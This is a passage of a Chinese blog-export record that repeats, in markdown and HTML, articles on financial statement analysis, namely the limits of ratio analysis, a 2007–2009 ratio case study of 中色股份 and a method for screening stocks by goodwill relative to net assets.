该企业的权益乘数07年为2.38，08年为2.57，09年为2.46。从这些数据可以看出，该企业的权益乘数呈现逐年上升趋势的，但是也是稳中有降的。说明一开始企业较多依赖负债，当意识到带来的企业风险也较大时，股东就加大了权益性资产投入，增大了权益性资本在资产总额中的比重，选择调整为稳健的财务结构，于是降低了权益乘数，使公司更好地利用财务杠杆的作用。\n\n04.长期偿债能力分析\n\n（1）利息保障倍数\n\n该企业的资产负债率07年为10.78，08年为2.92，09年为3.19。从这些数据可以看出，该企业的利息保障倍数呈现逐年下降的趋势。08年金融危机来的当年影响最大，后又缓慢上升，说明企业经营开始好转。利息保障倍数越高，说明企业偿还债务能力越有保障，该企业07年到09年期间，利润有了大幅下降，而同时财务费用却有进一步增长，对债务的偿还能力有所降低，所以应该要多加注意。\n\n（2）有形资产净值债务率\n\n该企业的有形资产净值债务率07年为203.64%，08年为227.15%，09年为205.51%。从这些数据可以看出，该企业的有形资产净值债务率是呈现逐年上升趋势的，但是也是稳中有降的。该项指标越大，企业的经营风险就越高，长期偿债能力就越弱。以上数据可以看出，该企业正在努力降低该指标，以进一步有效提高企业的长期偿债能力。\n\n## **看商誉排雷：如何从财务报表辨别\"地雷\"公司**\n\n启智得宁\n\n百家号18-12-1117:26\n\n随着中国经济国际化进程的不断推进，今年，一系列改革措施陆续推出，包括停复牌制度、回购制度，信息披露制度等，资本市场也逐步开始与国际接轨。中国股市也在一步步走向成熟，投资方式也会有别于以往，不可避免，价值投资会成为未来的主流。\n\n说到价值投资，那就离不开财务报表，中国会计准则发展要晚于国际主流国家，与国际接轨也是在加入WTO之后，直到现在仍然存在较多不完善的地方。\n\n会计准则的不完善外加上市公司财务报表粉饰的手段越来越多，让一些非专业的人士在做股票投资时频频踩雷，以下介绍商誉排雷的方式，让我们以后的投资路上少踩\"地雷\"。\n\n先说一下商誉的概念：一家公司收购另一家公司支付的价格超过被收购公司的公允价值部分叫商誉。举个例子,A公司收购B公司，假如B公司是上市公司，B市值是2亿，A公司出资2.5亿收购，那么商誉就是5000万。\n\n这里可简单理解为一个东西市场价值只值5块钱，但要花10块钱去买，多出来的部分就是商誉。为什么要多花钱去买呢，通常是因为被收购企业会与母公司产生协同效应，也就是1+1大于2的效应。\n\n但这也就产生了一个问题，如果被收购公司不能产生协同效应，且质地非常差，未来也不能给企业带来利润增长，但仍然花大价格去买，这中间很可能就涉及到利益输送。\n\n假如与上市公司高层有利益牵扯的人，随便做一家公司，之后上市公司有高价收购回去。这样就把上市公司的资金转移过去了，而通常来讲上市公司是全体股民所以，使用超过企业本身价值的高价收购损失的也是全体股民。完成上面这样的收购，通常就会产生商誉，商誉就会在母公司财务报表中体现出来。\n\n这个套路影视行业玩的最厉害，从行业的财务就看的出来，某上市公司影视娱乐公司旗下的艺人随便成立一个工作室，然后上市公司就斥巨资来收购，间接就完成了资产转移，这样在母公司财报里面产生天量商誉。大家可以看看，目前影视类公司的商誉普遍占净资产达到30%以上。如果两公司没任何协同效应，这些商誉价值也就为零，但仍几十上百亿的挂在资产负债表中的资产项目中。而且这些商誉地未来公司赚钱时还会做减值测试，也就是说会从利润里面扣除，直接就影响公司净利润。\n\n因此，在做投资时，很简单，打开财务报表，翻到资产负债表，看资产项目下商誉有多少，再看商誉占净资产的比率，只要占比达到10%以上的就可以排除，或许可能错过一些好公司，但绝对能规避一大批成心思不正的上市公司。\n","slug":"一个经典的公司财务报表分析案例","published":1,"updated":"2024-11-15T14:18:27.678Z","comments":1,"layout":"post","photos":[],"_id":"cm3kcor32000m8oi461d36b9n","content":"<p>财务报表的使用人有许多种，包括权益投资人、债权人、经理人员、政府机构和其他与企业有利益关系的人士。他们出于不同目的使用财务报表，需要不同的信息，采用不同的分析程序。</p>\n<p>(一)债权人</p>\n<p>债权人是指借款给企业并得到企业还款承诺的人。债权人关心企业是否具有偿还债务的能力。债权人可以分为短期债权人和长期债权人。</p>\n<p>债权人的主要决策：决定是否给企业提供信用，以及是否需要提前收回债权。他们进行财务报表分析是为了回答以下几方面的问题：</p>\n<p>1、公司为什么需要额外筹集资金;</p>\n<p>2、公司还本付息所需资金的可能来源是什么;</p>\n<p>3、公司对于以前的短期和长期借款是否按期偿还;</p>\n<p>4、公司将来在哪些方面还需要借款。</p>\n<p>(二)投资人</p>\n<p>投资人是指公司的权益投资人即普通股股东。普通股股东投资于公司的目的是扩大自己的财富。他们所关心的是包括偿债能力、收益能力以及投资风险等等。</p>\n<p>权益投资人进行财务报表分析，是为了回答以下几方面的问题：</p>\n<p>1、公司当前和长期的收益水平高低，以及公司收益是否容易受重大变动的影响;</p>\n<p>2、财务状况如何，公司资本结构决定的风险和报酬如何;</p>\n<p>3、与其他竞争者相比，公司处于何种地位。</p>\n<p>(三)经理人员</p>\n<p>经理人员是指被所有者聘用的、对公司资产和负债进行管理的个人组成的团体，有时称之为”管理当局”。</p>\n<p>经理人员关心公司的财务状况、盈利能力和持续发展的能力。经理人员可以获取外部使用人无法得到的内部信息。他们分析报表的主要目的是改善报表。</p>\n<p>(四)政府机构有关人士</p>\n<p>政府机构也是公司财务报表的使用人，包括税务部门、国有企业的管理部门、证券管理机构、会计监管机构和社会保障部门等。他们使用财务报表是为了履行自己的监督管理职责。</p>\n<p>(5) 其他人士</p>\n<p>财务报表分析对于了解企业的财务状况和经营业绩，评价企业的偿债能力和盈利能力，制定经济决策，都有着显着的作用。但由于种种因素的影响，财务报表分析及其分析方法，也存在着一定的局限性。在分析中，应注意这些局限性的影响，以保证分析结果的正确性。</p>\n<p><strong>（1）会计处理方法及分析方法对报表可比性的影响。</strong></p>\n<p>会计核算上不同的处理方法产生的数据会有差别。例如固定资产采用直线折旧法或采用加速折旧法，折旧费也不同。企业长期投资采用成本法与采用权益法所确认的投资收益也不一样。因此，如果企业前后期会计处理方法改变，对前后期财务报表对比分析就会有影响。同样，一个企业与另一个企业比较，如果两个企业对同一事项的会计处理采用的方法不一样，数据的可比性也会降低。所以在分析报表时，一定要注意看附注，看看企业使用的是什么方法以及方法有无变更等。</p>\n<p>从财务报表分析方法来看，某些指标计算方法不同也会给不同企业之间的比较带来不同程度的影响。例如应收账款周转率、存货周转率等，其平均余额的计算，报表使用者由于数据的限制，往往用年初数与年末数进行平均，这样平均计算应收账款余额与存货余额，在经营业务一年内各月各季较均衡的企业尚可，但在季节性经营的企业或各月变动情况较大的情况下，如期初与期末正好是经营旺季，其平均余额就会过大，如是淡季，则又会过小，从而影响到指标的准确性。</p>\n<p>此外，财务报表分析、指标评价要与其他企业以及行业平均指标比较才有意义。但各企业不同的情况，如环境影响、企业规模、会计核算方法的差别，会对可比性产生影响。而行业平均指标，往往是各种各样情况的综合或折衷，如果行业平均指标是采用抽样调查得到的，在抽到极端样本时，还会歪曲整个行业情况。因此，在对比分析时，应慎重使用行业平均指标，对不同企业进行比较时应注意调整一些不可比因素的影响。</p>\n<p><strong>（2）通货膨胀的影响。</strong></p>\n<p>由于中国的财务报表是按照历史成本原则编制的，在通货膨胀时期，有关数据会受到物价变动的影响，使其不能真实地反映企业的财务状况和经营成果，引起报表使用者的误解。例如，以历史成本为基础的资产价值必然小于资产当前的价值，以前以500万元购买的固定资产，重置成本可能为800万元，但账上及报表上仍反映为500万元固定资产原价。如不知道该资产是哪一年买的，仅仅靠这个数据，不能正确理解一个企业的生产规模。进一步说，折旧费是按固定资产原价提取的，利润是扣减这种折旧费计算出来的，由于折旧费定低了，企业将无力重置价格已上涨的资产；同时由于折旧费定低了，利润算多了，可能会导致企业多交所得税，多付利润，最终可能使企业的简单再生产也难以维持。</p>\n<p><strong>（3）信息的时效性问题。</strong></p>\n<p>财务报表中的数据，均是企业过去经济活动的结果。用这些数据来预测企业未来的动态，只有参考价值，并非绝对合理可靠。而且等报表使用者取得各种报表时，可能离报表编制日已过去多日。</p>\n<p><strong>（4）报表数据信息量的限制。</strong></p>\n<p>由于报表本身的原因，其提供的数据是有限的。对报表使用者来说，可能不少需要使用的信息，在报表或附注中找不到。</p>\n<p><strong>（5）报表数据的可靠性问题。</strong></p>\n<p>有时，企业为了使报表显示出企业良好的财务状况及经营成果，会在会计核算方法上采用其他手段来粉饰财务报表。这时财务报表分析就容易误入歧途。</p>\n<p>以上关于财务报表分析及其分析方法局限性的种种说明并不能否定财务报表分析的积极作用，了解这些局限性，分析报表时注意它们的影响，可以提高财务报表分析的质量。</p>\n<p>此外，报表使用者在阅读和分析企业财务报表时，一定不要忽略报表附表和附注。仔细阅读有关附表和附注，能使人们正确理解报表上所反映的信息，不至产生错误的判断和结论。同时，在阅读报表时，还应注意注册会计师&quot;审计报告&quot;的意见。注册会计师从第三者公正的立场，从专业人士的角度，对企业报表数据是否真实、可靠、可验证等方面的评价，对于报表使用者是很有用的。</p>\n<h2 id=\"一个经典的公司财务报表分析案例，很详细！\"><a href=\"#一个经典的公司财务报表分析案例，很详细！\" class=\"headerlink\" title=\"一个经典的公司财务报表分析案例，很详细！\"></a><strong>一个经典的公司财务报表分析案例，很详细！</strong></h2><p>会计学堂</p>\n<p>百家号18-09-0913:47</p>\n<p>标题说是经典的案例分析，实际上也就是一个普通的分析。会计的东西太多，教科书上的东东太多。而结合企业战略、市场的变化、同行的情况、内部的管理、制度以及会计政策，等方面，分析的太少。所以，本文仅适用于财务经理级别以下的人员，是有用的。可以上交给财务经理，供其进一步分析和提炼，才能上交到最高管理层。</p>\n<p>1.中色股份有限公司概况</p>\n<p>中国有色金属建设股份有限公司主要从事国际工程承包和有色金属矿产资源开发。1997年4月16日进行资产重组，剥离优质资产改制组建中色股份，并在深圳证券交易所挂牌上市。</p>\n<p>目前，中色股份旗下控股多个公司，涉及矿业、冶炼、稀土、能源电力等领域；同时，通过入股民生人寿等稳健的实业投资，增强企业的抗风险能力，实现稳定发展。</p>\n<p>2.资产负债比较分析</p>\n<p>资产负债增减变动趋势表</p>\n<img src=\"/2024/11/15/%E4%B8%80%E4%B8%AA%E7%BB%8F%E5%85%B8%E7%9A%84%E5%85%AC%E5%8F%B8%E8%B4%A2%E5%8A%A1%E6%8A%A5%E8%A1%A8%E5%88%86%E6%9E%90%E6%A1%88%E4%BE%8B/2022-12-21-22-54-11-2022-08-21-17-05-59-image.png\" class=\"\">\n\n<p>01.增减变动分析</p>\n<p>从上表可以清楚看到，中色股份有限公司的资产规模是呈逐年上升趋势的。从负债率及股东权益的变化可以看出虽然所有者权益的绝对数额每年都在增长，但是其增长幅度明显没有负债增长幅度大，该公司负债累计增长了20.49%，而股东权益仅仅增长了13.96%，这说明该公司资金实力的增长依靠了较多的负债增长，说明该公司一直采用相对高风险、高回报的财务政策，一方面利用负债扩大企业资产规模，另一方面增大了该企业的风险。</p>\n<p>（1）资产的变化分析</p>\n<p>08年度比上年度增长了8%，09年度较上年度增长了9.02%；该公司的固定资产投资在09年有了巨大增长，说明09年度有更大的建设发展项目。总体来看，该公司的资产是在增长的，说明该企业的未来前景很好。</p>\n<p>（2）负债的变化分析</p>\n<p>从上表可以清楚地看到，该公司的负债总额也是呈逐年上升趋势的，08年度比07年度增长了13.74%，09年度较上年度增长了5.94%；从以上数据对比可以看到，当金融危机来到的08年，该公司的负债率有明显上升趋势，09年度公司有了好转迹象，负债率有所回落。我们也可以看到，08年当资产减少的同时负债却在增加，09年正好是相反的现象，说明公司意识到负债带来了高风险，转而采取了较稳健的财务政策。</p>\n<p>（3）股东权益的变化分析</p>\n<p>该公司08年与09年都有不同程度的上升，所不同的是，09年有了更大的增幅。而这个增幅主要是由于负债的减少，说明股东也意识到了负债带来的企业风险，也关注自己的权益，怕影响到自己的权益。</p>\n<p>02.短期偿债能力分析</p>\n<p>（1）流动比率</p>\n<p>该公司07年的流动比率为1.12，08年为1.04，09年为1.12，相对来说还比较稳健，只是08年度略有降低。1元的负债约有1.12元的资产作保障，说明企业的短期偿债能力相对比较平稳。</p>\n<p>（2）速动比率</p>\n<p>该公司07年的速动比率为0.89，08年为0.81，09年为0.86，相对来说，没有大的波动，只是略呈下降趋势。每1元的流动负债只有0.86元的资产作保障，是绝对不够的，这表明该企业的短期偿债能力较弱。</p>\n<p>（3）现金比率</p>\n<p>该公司07年的现金比率为0.35，08年为0.33，09年为0.38，从这些数据可以看出，该公司的现金即付能力较强，并且呈逐年上升趋势的，但是相对数还是较低，说明了一元的流动负债有0.38元的现金资产作为偿还保障，其短期偿债能力还是可以的。</p>\n<p>03.资本结构分析</p>\n<p>（1）资产负债率</p>\n<p>该企业的资产负债率07年为58.92%，08年为61.14%09年为59.42%。从这些数据可以看出，该企业的资产负债率呈现逐年上升趋势的，但是是稳中有降的，说明该企业开始调节自身的资本结构，以降低负债带来的企业风险，资产负债率越高，说明企业的长期偿债能力就越弱，债权人的保证程度就越弱。该企业的长期偿债能力虽然不强，但是该企业的风险系数却较低，对债权人的保证程度较高。</p>\n<p>（2）产权比率</p>\n<p>该企业的产权比率07年为138.46%，08年为157.37%，09年为146.39%。从这些数据可以看出，该企业的产权比率呈现逐年上升趋势的，但是稳中有降的，从该比率可以看出，该企业对负债的依赖度还是比较高的，相应企业的风险也较高。该企业的长期偿债能力还是较低的。不过，该企业已经意识到企业的风险不能过大，一旦过大将带来重大经营风险，所以，该企业试图从高风险、高回报的财务结构向较为保守的财务结构过渡，逐渐增大所有者权益比例。</p>\n<p>（3）权益乘数</p>\n<p>该企业的权益乘数07年为2.38，08年为2.57，09年为2.46。从这些数据可以看出，该企业的权益乘数呈现逐年上升趋势的，但是也是稳中有降的。说明一开始企业较多依赖负债，当意识到带来的企业风险也较大时，股东就加大了权益性资产投入，增大了权益性资本在资产总额中的比重，选择调整为稳健的财务结构，于是降低了权益乘数，使公司更好地利用财务杠杆的作用。</p>\n<p>04.长期偿债能力分析</p>\n<p>（1）利息保障倍数</p>\n<p>该企业的资产负债率07年为10.78，08年为2.92，09年为3.19。从这些数据可以看出，该企业的利息保障倍数呈现逐年下降的趋势。08年金融危机来的当年影响最大，后又缓慢上升，说明企业经营开始好转。利息保障倍数越高，说明企业偿还债务能力越有保障，该企业07年到09年期间，利润有了大幅下降，而同时财务费用却有进一步增长，对债务的偿还能力有所降低，所以应该要多加注意。</p>\n<p>（2）有形资产净值债务率</p>\n<p>该企业的有形资产净值债务率07年为203.64%，08年为227.15%，09年为205.51%。从这些数据可以看出，该企业的有形资产净值债务率是呈现逐年上升趋势的，但是也是稳中有降的。该项指标越大，企业的经营风险就越高，长期偿债能力就越弱。以上数据可以看出，该企业正在努力降低该指标，以进一步有效提高企业的长期偿债能力。</p>\n<h2 id=\"看商誉排雷：如何从财务报表辨别”地雷”公司\"><a href=\"#看商誉排雷：如何从财务报表辨别”地雷”公司\" class=\"headerlink\" title=\"看商誉排雷：如何从财务报表辨别”地雷”公司\"></a><strong>看商誉排雷：如何从财务报表辨别”地雷”公司</strong></h2><p>启智得宁</p>\n<p>百家号18-12-1117:26</p>\n<p>随着中国经济国际化进程的不断推进，今年，一系列改革措施陆续推出，包括停复牌制度、回购制度，信息披露制度等，资本市场也逐步开始与国际接轨。中国股市也在一步步走向成熟，投资方式也会有别于以往，不可避免，价值投资会成为未来的主流。</p>\n<p>说到价值投资，那就离不开财务报表，中国会计准则发展要晚于国际主流国家，与国际接轨也是在加入WTO之后，直到现在仍然存在较多不完善的地方。</p>\n<p>会计准则的不完善外加上市公司财务报表粉饰的手段越来越多，让一些非专业的人士在做股票投资时频频踩雷，以下介绍商誉排雷的方式，让我们以后的投资路上少踩”地雷”。</p>\n<p>先说一下商誉的概念：一家公司收购另一家公司支付的价格超过被收购公司的公允价值部分叫商誉。举个例子,A公司收购B公司，假如B公司是上市公司，B市值是2亿，A公司出资2.5亿收购，那么商誉就是5000万。</p>\n<p>这里可简单理解为一个东西市场价值只值5块钱，但要花10块钱去买，多出来的部分就是商誉。为什么要多花钱去买呢，通常是因为被收购企业会与母公司产生协同效应，也就是1+1大于2的效应。</p>\n<p>但这也就产生了一个问题，如果被收购公司不能产生协同效应，且质地非常差，未来也不能给企业带来利润增长，但仍然花大价格去买，这中间很可能就涉及到利益输送。</p>\n<p>假如与上市公司高层有利益牵扯的人，随便做一家公司，之后上市公司有高价收购回去。这样就把上市公司的资金转移过去了，而通常来讲上市公司是全体股民所以，使用超过企业本身价值的高价收购损失的也是全体股民。完成上面这样的收购，通常就会产生商誉，商誉就会在母公司财务报表中体现出来。</p>\n<p>这个套路影视行业玩的最厉害，从行业的财务就看的出来，某上市公司影视娱乐公司旗下的艺人随便成立一个工作室，然后上市公司就斥巨资来收购，间接就完成了资产转移，这样在母公司财报里面产生天量商誉。大家可以看看，目前影视类公司的商誉普遍占净资产达到30%以上。如果两公司没任何协同效应，这些商誉价值也就为零，但仍几十上百亿的挂在资产负债表中的资产项目中。而且这些商誉地未来公司赚钱时还会做减值测试，也就是说会从利润里面扣除，直接就影响公司净利润。</p>\n<p>因此，在做投资时，很简单，打开财务报表，翻到资产负债表，看资产项目下商誉有多少，再看商誉占净资产的比率，只要占比达到10%以上的就可以排除，或许可能错过一些好公司，但绝对能规避一大批成心思不正的上市公司。</p>\n","excerpt":"","more":"<p>财务报表的使用人有许多种，包括权益投资人、债权人、经理人员、政府机构和其他与企业有利益关系的人士。他们出于不同目的使用财务报表，需要不同的信息，采用不同的分析程序。</p>\n<p>(一)债权人</p>\n<p>债权人是指借款给企业并得到企业还款承诺的人。债权人关心企业是否具有偿还债务的能力。债权人可以分为短期债权人和长期债权人。</p>\n<p>债权人的主要决策：决定是否给企业提供信用，以及是否需要提前收回债权。他们进行财务报表分析是为了回答以下几方面的问题：</p>\n<p>1、公司为什么需要额外筹集资金;</p>\n<p>2、公司还本付息所需资金的可能来源是什么;</p>\n<p>3、公司对于以前的短期和长期借款是否按期偿还;</p>\n<p>4、公司将来在哪些方面还需要借款。</p>\n<p>(二)投资人</p>\n<p>投资人是指公司的权益投资人即普通股股东。普通股股东投资于公司的目的是扩大自己的财富。他们所关心的是包括偿债能力、收益能力以及投资风险等等。</p>\n<p>权益投资人进行财务报表分析，是为了回答以下几方面的问题：</p>\n<p>1、公司当前和长期的收益水平高低，以及公司收益是否容易受重大变动的影响;</p>\n<p>2、财务状况如何，公司资本结构决定的风险和报酬如何;</p>\n<p>3、与其他竞争者相比，公司处于何种地位。</p>\n<p>(三)经理人员</p>\n<p>经理人员是指被所有者聘用的、对公司资产和负债进行管理的个人组成的团体，有时称之为”管理当局”。</p>\n<p>经理人员关心公司的财务状况、盈利能力和持续发展的能力。经理人员可以获取外部使用人无法得到的内部信息。他们分析报表的主要目的是改善报表。</p>\n<p>(四)政府机构有关人士</p>\n<p>政府机构也是公司财务报表的使用人，包括税务部门、国有企业的管理部门、证券管理机构、会计监管机构和社会保障部门等。他们使用财务报表是为了履行自己的监督管理职责。</p>\n<p>(5) 其他人士</p>\n<p>财务报表分析对于了解企业的财务状况和经营业绩，评价企业的偿债能力和盈利能力，制定经济决策，都有着显着的作用。但由于种种因素的影响，财务报表分析及其分析方法，也存在着一定的局限性。在分析中，应注意这些局限性的影响，以保证分析结果的正确性。</p>\n<p><strong>（1）会计处理方法及分析方法对报表可比性的影响。</strong></p>\n<p>会计核算上不同的处理方法产生的数据会有差别。例如固定资产采用直线折旧法或采用加速折旧法，折旧费也不同。企业长期投资采用成本法与采用权益法所确认的投资收益也不一样。因此，如果企业前后期会计处理方法改变，对前后期财务报表对比分析就会有影响。同样，一个企业与另一个企业比较，如果两个企业对同一事项的会计处理采用的方法不一样，数据的可比性也会降低。所以在分析报表时，一定要注意看附注，看看企业使用的是什么方法以及方法有无变更等。</p>\n<p>从财务报表分析方法来看，某些指标计算方法不同也会给不同企业之间的比较带来不同程度的影响。例如应收账款周转率、存货周转率等，其平均余额的计算，报表使用者由于数据的限制，往往用年初数与年末数进行平均，这样平均计算应收账款余额与存货余额，在经营业务一年内各月各季较均衡的企业尚可，但在季节性经营的企业或各月变动情况较大的情况下，如期初与期末正好是经营旺季，其平均余额就会过大，如是淡季，则又会过小，从而影响到指标的准确性。</p>\n<p>此外，财务报表分析、指标评价要与其他企业以及行业平均指标比较才有意义。但各企业不同的情况，如环境影响、企业规模、会计核算方法的差别，会对可比性产生影响。而行业平均指标，往往是各种各样情况的综合或折衷，如果行业平均指标是采用抽样调查得到的，在抽到极端样本时，还会歪曲整个行业情况。因此，在对比分析时，应慎重使用行业平均指标，对不同企业进行比较时应注意调整一些不可比因素的影响。</p>\n<p><strong>（2）通货膨胀的影响。</strong></p>\n<p>由于中国的财务报表是按照历史成本原则编制的，在通货膨胀时期，有关数据会受到物价变动的影响，使其不能真实地反映企业的财务状况和经营成果，引起报表使用者的误解。例如，以历史成本为基础的资产价值必然小于资产当前的价值，以前以500万元购买的固定资产，重置成本可能为800万元，但账上及报表上仍反映为500万元固定资产原价。如不知道该资产是哪一年买的，仅仅靠这个数据，不能正确理解一个企业的生产规模。进一步说，折旧费是按固定资产原价提取的，利润是扣减这种折旧费计算出来的，由于折旧费定低了，企业将无力重置价格已上涨的资产；同时由于折旧费定低了，利润算多了，可能会导致企业多交所得税，多付利润，最终可能使企业的简单再生产也难以维持。</p>\n<p><strong>（3）信息的时效性问题。</strong></p>\n<p>财务报表中的数据，均是企业过去经济活动的结果。用这些数据来预测企业未来的动态，只有参考价值，并非绝对合理可靠。而且等报表使用者取得各种报表时，可能离报表编制日已过去多日。</p>\n<p><strong>（4）报表数据信息量的限制。</strong></p>\n<p>由于报表本身的原因，其提供的数据是有限的。对报表使用者来说，可能不少需要使用的信息，在报表或附注中找不到。</p>\n<p><strong>（5）报表数据的可靠性问题。</strong></p>\n<p>有时，企业为了使报表显示出企业良好的财务状况及经营成果，会在会计核算方法上采用其他手段来粉饰财务报表。这时财务报表分析就容易误入歧途。</p>\n<p>以上关于财务报表分析及其分析方法局限性的种种说明并不能否定财务报表分析的积极作用，了解这些局限性，分析报表时注意它们的影响，可以提高财务报表分析的质量。</p>\n<p>此外，报表使用者在阅读和分析企业财务报表时，一定不要忽略报表附表和附注。仔细阅读有关附表和附注，能使人们正确理解报表上所反映的信息，不至产生错误的判断和结论。同时，在阅读报表时，还应注意注册会计师&quot;审计报告&quot;的意见。注册会计师从第三者公正的立场，从专业人士的角度，对企业报表数据是否真实、可靠、可验证等方面的评价，对于报表使用者是很有用的。</p>\n<h2 id=\"一个经典的公司财务报表分析案例，很详细！\"><a href=\"#一个经典的公司财务报表分析案例，很详细！\" class=\"headerlink\" title=\"一个经典的公司财务报表分析案例，很详细！\"></a><strong>一个经典的公司财务报表分析案例，很详细！</strong></h2><p>会计学堂</p>\n<p>百家号18-09-0913:47</p>\n<p>标题说是经典的案例分析，实际上也就是一个普通的分析。会计的东西太多，教科书上的东东太多。而结合企业战略、市场的变化、同行的情况、内部的管理、制度以及会计政策，等方面，分析的太少。所以，本文仅适用于财务经理级别以下的人员，是有用的。可以上交给财务经理，供其进一步分析和提炼，才能上交到最高管理层。</p>\n<p>1.中色股份有限公司概况</p>\n<p>中国有色金属建设股份有限公司主要从事国际工程承包和有色金属矿产资源开发。1997年4月16日进行资产重组，剥离优质资产改制组建中色股份，并在深圳证券交易所挂牌上市。</p>\n<p>目前，中色股份旗下控股多个公司，涉及矿业、冶炼、稀土、能源电力等领域；同时，通过入股民生人寿等稳健的实业投资，增强企业的抗风险能力，实现稳定发展。</p>\n<p>2.资产负债比较分析</p>\n<p>资产负债增减变动趋势表</p>\n<img src=\"/2024/11/15/%E4%B8%80%E4%B8%AA%E7%BB%8F%E5%85%B8%E7%9A%84%E5%85%AC%E5%8F%B8%E8%B4%A2%E5%8A%A1%E6%8A%A5%E8%A1%A8%E5%88%86%E6%9E%90%E6%A1%88%E4%BE%8B/2022-12-21-22-54-11-2022-08-21-17-05-59-image.png\" class=\"\">\n\n<p>01.增减变动分析</p>\n<p>从上表可以清楚看到，中色股份有限公司的资产规模是呈逐年上升趋势的。从负债率及股东权益的变化可以看出虽然所有者权益的绝对数额每年都在增长，但是其增长幅度明显没有负债增长幅度大，该公司负债累计增长了20.49%，而股东权益仅仅增长了13.96%，这说明该公司资金实力的增长依靠了较多的负债增长，说明该公司一直采用相对高风险、高回报的财务政策，一方面利用负债扩大企业资产规模，另一方面增大了该企业的风险。</p>\n<p>（1）资产的变化分析</p>\n<p>08年度比上年度增长了8%，09年度较上年度增长了9.02%；该公司的固定资产投资在09年有了巨大增长，说明09年度有更大的建设发展项目。总体来看，该公司的资产是在增长的，说明该企业的未来前景很好。</p>\n<p>（2）负债的变化分析</p>\n<p>从上表可以清楚地看到，该公司的负债总额也是呈逐年上升趋势的，08年度比07年度增长了13.74%，09年度较上年度增长了5.94%；从以上数据对比可以看到，当金融危机来到的08年，该公司的负债率有明显上升趋势，09年度公司有了好转迹象，负债率有所回落。我们也可以看到，08年当资产减少的同时负债却在增加，09年正好是相反的现象，说明公司意识到负债带来了高风险，转而采取了较稳健的财务政策。</p>\n<p>（3）股东权益的变化分析</p>\n<p>该公司08年与09年都有不同程度的上升，所不同的是，09年有了更大的增幅。而这个增幅主要是由于负债的减少，说明股东也意识到了负债带来的企业风险，也关注自己的权益，怕影响到自己的权益。</p>\n<p>02.短期偿债能力分析</p>\n<p>（1）流动比率</p>\n<p>该公司07年的流动比率为1.12，08年为1.04，09年为1.12，相对来说还比较稳健，只是08年度略有降低。1元的负债约有1.12元的资产作保障，说明企业的短期偿债能力相对比较平稳。</p>\n<p>（2）速动比率</p>\n<p>该公司07年的速动比率为0.89，08年为0.81，09年为0.86，相对来说，没有大的波动，只是略呈下降趋势。每1元的流动负债只有0.86元的资产作保障，是绝对不够的，这表明该企业的短期偿债能力较弱。</p>\n<p>（3）现金比率</p>\n<p>该公司07年的现金比率为0.35，08年为0.33，09年为0.38，从这些数据可以看出，该公司的现金即付能力较强，并且呈逐年上升趋势的，但是相对数还是较低，说明了一元的流动负债有0.38元的现金资产作为偿还保障，其短期偿债能力还是可以的。</p>\n<p>03.资本结构分析</p>\n<p>（1）资产负债率</p>\n<p>该企业的资产负债率07年为58.92%，08年为61.14%09年为59.42%。从这些数据可以看出，该企业的资产负债率呈现逐年上升趋势的，但是是稳中有降的，说明该企业开始调节自身的资本结构，以降低负债带来的企业风险，资产负债率越高，说明企业的长期偿债能力就越弱，债权人的保证程度就越弱。该企业的长期偿债能力虽然不强，但是该企业的风险系数却较低，对债权人的保证程度较高。</p>\n<p>（2）产权比率</p>\n<p>该企业的产权比率07年为138.46%，08年为157.37%，09年为146.39%。从这些数据可以看出，该企业的产权比率呈现逐年上升趋势的，但是稳中有降的，从该比率可以看出，该企业对负债的依赖度还是比较高的，相应企业的风险也较高。该企业的长期偿债能力还是较低的。不过，该企业已经意识到企业的风险不能过大，一旦过大将带来重大经营风险，所以，该企业试图从高风险、高回报的财务结构向较为保守的财务结构过渡，逐渐增大所有者权益比例。</p>\n<p>（3）权益乘数</p>\n<p>该企业的权益乘数07年为2.38，08年为2.57，09年为2.46。从这些数据可以看出，该企业的权益乘数呈现逐年上升趋势的，但是也是稳中有降的。说明一开始企业较多依赖负债，当意识到带来的企业风险也较大时，股东就加大了权益性资产投入，增大了权益性资本在资产总额中的比重，选择调整为稳健的财务结构，于是降低了权益乘数，使公司更好地利用财务杠杆的作用。</p>\n<p>04.长期偿债能力分析</p>\n<p>（1）利息保障倍数</p>\n<p>该企业的资产负债率07年为10.78，08年为2.92，09年为3.19。从这些数据可以看出，该企业的利息保障倍数呈现逐年下降的趋势。08年金融危机来的当年影响最大，后又缓慢上升，说明企业经营开始好转。利息保障倍数越高，说明企业偿还债务能力越有保障，该企业07年到09年期间，利润有了大幅下降，而同时财务费用却有进一步增长，对债务的偿还能力有所降低，所以应该要多加注意。</p>\n<p>（2）有形资产净值债务率</p>\n<p>该企业的有形资产净值债务率07年为203.64%，08年为227.15%，09年为205.51%。从这些数据可以看出，该企业的有形资产净值债务率是呈现逐年上升趋势的，但是也是稳中有降的。该项指标越大，企业的经营风险就越高，长期偿债能力就越弱。以上数据可以看出，该企业正在努力降低该指标，以进一步有效提高企业的长期偿债能力。</p>\n<h2 id=\"看商誉排雷：如何从财务报表辨别”地雷”公司\"><a href=\"#看商誉排雷：如何从财务报表辨别”地雷”公司\" class=\"headerlink\" title=\"看商誉排雷：如何从财务报表辨别”地雷”公司\"></a><strong>看商誉排雷：如何从财务报表辨别”地雷”公司</strong></h2><p>启智得宁</p>\n<p>百家号18-12-1117:26</p>\n<p>随着中国经济国际化进程的不断推进，今年，一系列改革措施陆续推出，包括停复牌制度、回购制度，信息披露制度等，资本市场也逐步开始与国际接轨。中国股市也在一步步走向成熟，投资方式也会有别于以往，不可避免，价值投资会成为未来的主流。</p>\n<p>说到价值投资，那就离不开财务报表，中国会计准则发展要晚于国际主流国家，与国际接轨也是在加入WTO之后，直到现在仍然存在较多不完善的地方。</p>\n<p>会计准则的不完善外加上市公司财务报表粉饰的手段越来越多，让一些非专业的人士在做股票投资时频频踩雷，以下介绍商誉排雷的方式，让我们以后的投资路上少踩”地雷”。</p>\n<p>先说一下商誉的概念：一家公司收购另一家公司支付的价格超过被收购公司的公允价值部分叫商誉。举个例子,A公司收购B公司，假如B公司是上市公司，B市值是2亿，A公司出资2.5亿收购，那么商誉就是5000万。</p>\n<p>这里可简单理解为一个东西市场价值只值5块钱，但要花10块钱去买，多出来的部分就是商誉。为什么要多花钱去买呢，通常是因为被收购企业会与母公司产生协同效应，也就是1+1大于2的效应。</p>\n<p>但这也就产生了一个问题，如果被收购公司不能产生协同效应，且质地非常差，未来也不能给企业带来利润增长，但仍然花大价格去买，这中间很可能就涉及到利益输送。</p>\n<p>假如与上市公司高层有利益牵扯的人，随便做一家公司，之后上市公司有高价收购回去。这样就把上市公司的资金转移过去了，而通常来讲上市公司是全体股民所以，使用超过企业本身价值的高价收购损失的也是全体股民。完成上面这样的收购，通常就会产生商